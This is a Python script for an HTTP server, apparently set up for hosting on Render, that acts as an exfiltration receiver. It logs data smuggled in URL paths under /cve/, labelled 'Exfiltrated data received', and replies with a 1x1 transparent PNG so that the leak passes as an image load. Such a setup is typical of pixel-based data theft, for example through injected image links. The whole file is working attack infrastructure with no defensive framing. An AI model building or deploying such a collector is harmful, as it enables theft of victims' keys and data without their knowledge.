from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, unquote
import os
import time

class ExfilImageServer(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            parts = unquote(self.path).split('/')
            
            if self.path == '/':
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'Server is running. Use /cve/[data]/width/height')
                return

            if len(parts) >= 4 and parts[1] == 'cve':
                cle_pub = parts[2]
                width = parts[3] if len(parts) > 3 else "500"
                height = parts[4] if len(parts) > 4 else "300"

                print(f"\n[!] Exfiltrated data received:")
                print(f"    Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
                print(f"    Data: {cle_pub}")
                print(f"    Dimensions: {width}x{height}")
                print(f"    User-Agent: {self.headers.get('User-Agent')}")

                # PNG 1x1 transparent
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.end_headers()
                self.wfile.write(
                    b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01'
                    b'\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89'
                    b'\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01'
                    b'\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
                )
                return

            self.send_error(404, "Not Found - Use /cve/[data]/width/height")

        except Exception as e:
            print(f"Error handling request: {str(e)}")
            self.send_error(500, "Internal Server Error")

def run_server():
    port = int(os.environ.get('PORT', 8080))  # Render fournit le port dans l'ENV
    server_address = ('0.0.0.0', port)
    httpd = HTTPServer(server_address, ExfilImageServer)
    print(f"[*] Server running on port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
